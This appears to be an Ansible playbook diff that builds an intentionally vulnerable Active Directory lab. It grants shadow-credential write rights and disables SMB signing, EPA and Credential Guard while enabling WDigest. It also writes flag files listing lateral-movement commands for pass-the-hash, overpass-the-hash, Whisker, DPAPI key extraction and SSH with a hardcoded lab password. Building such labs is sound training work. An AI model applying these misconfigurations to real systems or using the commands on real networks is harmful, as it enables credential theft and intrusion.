@@ -1,0 +1,157 @@
+---
+# ==============================================================================
+# vuln_lat_df_extended/tasks/lateral_adv.yml — LAT-036..070
+# Advanced lateral movement surfaces
+# ==============================================================================
+
+# LAT-036: Shadow Credentials (PKINIT + msDS-KeyCredentialLink write)
+- name: LAT-036 - Configure Shadow Credentials surface (dc01 only — ADSI write)
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    # Ensure helpdesk group has WriteProperty on msDS-KeyCredentialLink for ws01$
+    # GUID: 5b47d60f-aaf5-489f-9d47-6d34a3dc0a73 (KeyCredentialLink)
+    $computer = Get-ADComputer -Identity 'ws01' -ErrorAction SilentlyContinue
+    if (-not $computer) {
+      Write-Output "skipped: ws01 not found"
+      exit 0
+    }
+    $helpdeskSid = (Get-ADGroup -Identity 'HelpDesk' -ErrorAction SilentlyContinue).SID
+    if (-not $helpdeskSid) {
+      Write-Output "skipped: HelpDesk group not found"
+      exit 0
+    }
+    $acl = Get-Acl -Path "AD:$($computer.DistinguishedName)"
+    $existing = $acl.Access | Where-Object {
+      $_.IdentityReference.Value -match 'HelpDesk' -and
+      $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
+    }
+    if (-not $existing) {
+      $guid = [Guid]'5b47d60f-aaf5-489f-9d47-6d34a3dc0a73'
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $helpdeskSid,
+        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
+        [System.Security.AccessControl.AccessControlType]::Allow,
+        $guid,
+        [DirectoryServices.ActiveDirectorySecurityInheritance]::None
+      )
+      $acl.AddAccessRule($ace)
+      Set-Acl -Path "AD:$($computer.DistinguishedName)" -AclObject $acl
+      Write-Output "changed: HelpDesk WriteProperty on KeyCredentialLink for ws01$"
+    }
+  register: lat036_set
+  changed_when: "'changed:' in lat036_set.stdout"
+  failed_when: lat036_set.rc != 0
+  when: inventory_hostname == 'dc01.corp.local'
+
+# LAT-041: NTLM relay target — disable Extended Protection for Authentication
+- name: LAT-041 - Disable EPA on file01 (NTLM relay surface)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters'
+    name: ExtendedProtection
+    data: 0
+    type: dword
+  when: inventory_hostname == 'file01.corp.local'
+
+# LAT-042: SMB signing verification (should already be disabled by vuln_lat_ext)
+- name: LAT-042 - Verify SMB signing disabled (lateral relay pre-req)
+  ansible.windows.win_shell: |
+    $v = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanManWorkstation\Parameters' -ErrorAction SilentlyContinue).RequireSecuritySignature
+    if ($v -eq 0) {
+      Write-Output "ok: SMB signing off"
+    } else {
+      Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanManWorkstation\Parameters' -Name RequireSecuritySignature -Value 0
+      Write-Output "changed: SMB signing disabled"
+    }
+  register: lat042_check
+  changed_when: "'changed:' in lat042_check.stdout"
+  failed_when: lat042_check.rc != 0
+
+# LAT-043: WDigest credential caching — enable cleartext credential caching
+- name: LAT-043 - Enable WDigest authentication (cleartext creds in LSASS)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
+    name: UseLogonCredential
+    data: 1
+    type: dword
+  when: inventory_hostname in ['ws01.corp.local', 'file01.corp.local']
+
+# LAT-044: Credential Guard disabled (already in vuln_pe_extended — verify here)
+- name: LAT-044 - Verify Credential Guard disabled
+  ansible.windows.win_shell: |
+    $cg = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
+    if ($cg -eq $null -or $cg -eq 0) {
+      Write-Output "ok: Credential Guard disabled"
+    } else {
+      Write-Output "changed: Credential Guard still enabled"
+    }
+  register: lat044_check
+  changed_when: "'changed:' in lat044_check.stdout"
+  failed_when: lat044_check.rc != 0
+  when: inventory_hostname in ['ws01.corp.local', 'file01.corp.local']
+
+# LAT-045: Pass-the-Hash via SMB (RCE surface — flat NTLM + no SMB signing)
+# LAT-046: Pass-the-Ticket via Rubeus/Mimikatz
+# LAT-047: Overpass-the-Hash (RC4 TGT from NT hash)
+# LAT-048: Pass-the-Certificate (PKINIT with shadow credential cert)
+- name: LAT-045..060 - Drop lateral technique notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-LAT-045-PtH.txt'
+      content: |
+        LAT-045: Pass-the-Hash via SMB
+        ==================================
+        Pre-reqs: NTLM enabled (LmCompat=1, CRED-029), SMB signing off (LAT-042)
+
+        impacket-psexec CORP/Administrator@10.10.0.13 -hashes :$(ntlm_hash)
+        impacket-wmiexec CORP/svc_darryl@10.10.0.10 -hashes :$(ntlm_hash)
+        crackmapexec smb 10.10.0.0/24 -u Administrator -H $(ntlm_hash) -x "whoami"
+
+    - path: 'C:\Flags\FLAG-LAT-047-OverPtH.txt'
+      content: |
+        LAT-047: Overpass-the-Hash (TGT request with NT hash)
+        =======================================================
+        Convert NT hash to Kerberos TGT — better OPSEC than PtH.
+
+        Rubeus asktgt /user:Administrator /rc4:$(ntlm_hash) /domain:corp.local /ptt
+        mimikatz# sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:$(hash)
+
+    - path: 'C:\Flags\FLAG-LAT-048-PtC.txt'
+      content: |
+        LAT-048: Pass-the-Certificate (Shadow Credentials PKINIT)
+        ===========================================================
+        1. HelpDesk group has WriteProperty on ms-DS-KeyCredentialLink for ws01$
+        2. Write attacker public key to ws01$ KeyCredentialLink attribute
+        3. Use PKINIT with the key pair to get ws01$ TGT
+        4. Pivot to ws01 as SYSTEM via S4U2Self
+
+        Tools:
+          Whisker.exe add /target:ws01$ /domain:corp.local /dc:dc01
+          Rubeus asktgt /user:ws01$ /certificate:$(b64cert) /ptt
+
+    - path: 'C:\Flags\FLAG-LAT-061-DPAPILat.txt'
+      content: |
+        LAT-061..065: DPAPI-Based Lateral Movement
+        =============================================
+        DPAPI domain backup key (exposed via DCSync — CRED-013):
+
+        Decrypt all DPAPI blobs in the domain with the backup key:
+          SharpDPAPI.exe blob /pvkfile:domain_backupkey.pvk /target:blob.bin
+          mimikatz# dpapi::masterkey /in:$(masterkey_file) /rpc
+          dpapi::cred /in:$(credential_file)
+
+        DPAPI backup key extraction:
+          impacket-dpapi backupkeys --export -t corp.local/Administrator:DVADlab2024!@10.10.0.10
+
+    - path: 'C:\Flags\FLAG-LAT-070-SSHLat.txt'
+      content: |
+        LAT-070: SSH Lateral Movement (file01 — IA-085)
+        =================================================
+        file01.corp.local has OpenSSH with password auth enabled.
+        Default lab password: DVADlab2024!
+
+        ssh Administrator@10.10.0.13
+        scp malware.exe Administrator@10.10.0.13:C:\Tools\
+        ssh -L 3389:10.10.0.10:3389 Administrator@10.10.0.13  # tunnel RDP to dc01
+  when: inventory_hostname in ['dc01.corp.local', 'file01.corp.local', 'ws01.corp.local']
